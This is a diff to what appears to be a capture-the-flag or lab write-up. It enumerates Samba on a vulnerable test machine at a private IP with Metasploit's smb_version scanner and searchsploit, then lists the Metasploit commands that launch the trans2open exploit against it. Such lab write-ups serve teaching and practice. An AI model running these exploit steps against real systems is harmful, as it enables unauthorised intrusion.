@@ -58,7 +58,41 @@ Now that we have verified the network configuration, the vulnerable machine's IP
 
 - We identified the following open ports: **22, 80, 111, 139, and 443**. We can now begin our attack methodology by identifying the services and their versions and checking for any known exploit. Since **SMB (port 139)** and **HTTP/HTTPS (ports 80 and 443)** are common attack surfaces, we will focus our initial enumeration on these services.
 
+- I will start with Samba enumeration, as Nmap did not display the Samba version. We will use the Metasploit Framework and its SMB scanner module to enumerate the service and hopefully identify its version.
 
+  ```bash
+  sudo msfconsole
+  search smb_version
+  use 0
+  show options
+  set rhosts 192.168.38.137
+  run
+  ```
+
+  <img width="1143" height="797" alt="image" src="https://github.com/user-attachments/assets/9b4b3bd4-0926-4980-b467-9a08decb43fb" />
+
+- We have now identified the Samba version running on the target machine (Samba 2.2.1a) and lets search if this version is vulnerable.
+
+```bash
+searchsploit samba 2.2.1a
+```
+
+<img width="1272" height="411" alt="image" src="https://github.com/user-attachments/assets/166e99bd-af92-4fb3-abd4-f59ae6afa684" />
+
+---
+
+
+## 3-Gaining Access
+
+- After identifying a known Trans2open vulnerability affecting the Samba version, we can use the corresponding exploit module in the Metasploit Framework.
+
+  ```bash
+  sudo msfconsole
+  use exploit/linux/samba/trans2open
+  show options
+  set rhosts 192.168.38.137
+  run
+  ```
 
 
   
